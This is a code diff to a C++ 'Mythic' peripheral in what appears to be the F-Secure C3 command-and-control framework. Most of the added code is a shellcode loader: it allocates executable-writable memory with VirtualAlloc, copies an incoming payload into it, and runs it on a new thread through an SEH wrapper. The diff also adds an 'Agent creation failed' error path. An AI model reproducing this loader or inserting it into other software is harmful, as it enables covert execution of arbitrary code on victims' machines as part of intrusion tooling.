@@ -2,16 +2,34 @@
 #include "Mythic.h"
 
 
-
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 FSecure::C3::Interfaces::Peripherals::Mythic::Mythic(ByteView arguments)
 	: m_NextMessageTime{ std::chrono::high_resolution_clock::now() }
 {
 	auto [pipeName, connectAttempts, automaticExecution, payload] = arguments.Read<std::string, uint32_t, std::string, ByteVector>();
 
+	BYTE* x = (BYTE*)payload.data();
+	SIZE_T len = payload.size();
+
+	namespace SEH = FSecure::WinTools::StructuredExceptionHandling;
+
 	if (automaticExecution != "false")
 	{
 		// TODO: Complete implementation
+		/*Log({ OBF_SEC("Automatic execution, executing payload"), LogMessage::Severity::DebugInformation });
+		if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(SEH::SehWrapperCov), &args, 0, nullptr))
+		{
+			throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
+		}*/
+		// Shellcode
+		PVOID pa = VirtualAlloc(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		if (nullptr == pa) {
+			throw std::runtime_error{ OBF("Couldn't allocate mem: ") + std::to_string(GetLastError()) + OBF(".") };
+		}
+		memcpy(pa, payload.data(), payload.size());
+		DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
+		if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(sehWrapper), pa, 0, nullptr))
+			throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
 	}
 
 	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give Agent thread time to start pipe.
@@ -32,6 +50,7 @@ FSecure::C3::Interfaces::Peripherals::Mythic::Mythic(ByteView arguments)
 			std::this_thread::sleep_for(std::chrono::milliseconds{ 100 });
 		}
 	}
+	throw std::runtime_error{ OBF("Agent creation failed") };
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -41,6 +60,7 @@ void FSecure::C3::Interfaces::Peripherals::Mythic::OnCommandFromConnector(ByteVi
 	Log({ OBF("Mythic received: ") + std::string{ packet.begin(), packet.size() < 10 ? packet.end() : packet.begin() + 10 } + OBF("..."), LogMessage::Severity::DebugInformation });
 
 	Log({ OBF("Mythic received: ") + std::string{ packet.begin(), packet.end()} + OBF("..."), LogMessage::Severity::DebugInformation });
+
 	m_Pipe->AsyncWrite(packet);
 }
 
